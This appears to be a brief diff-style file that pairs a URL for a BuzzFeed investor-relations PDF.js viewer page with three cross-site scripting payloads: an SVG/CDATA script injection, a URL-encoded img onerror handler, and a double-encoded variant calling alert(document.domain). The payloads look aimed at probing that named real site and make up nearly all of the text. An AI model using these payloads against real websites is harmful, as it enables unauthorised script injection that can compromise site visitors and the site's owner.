@@ -1,0 +1,10 @@
+https://ir.buzzfeed.com/sites/g/files/knoqqb70081/themes/site/nir_pid6499/pdf-viewer/pdf-js/web/viewer.html?file=/static-files/13d20068-d21b-456d-910d-4796060cd352
+
+
+
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+
+%27<img%20src%3D1%20onerror%3Dalert(1)%27
+
+
+%27%253Csvg%253E%253Ctitle%253E%253C![CDATA[%253C/title%253E%253Cscript%253Ealert(document.domain)%253C/script%253E]]%253C/svg%253E%2527
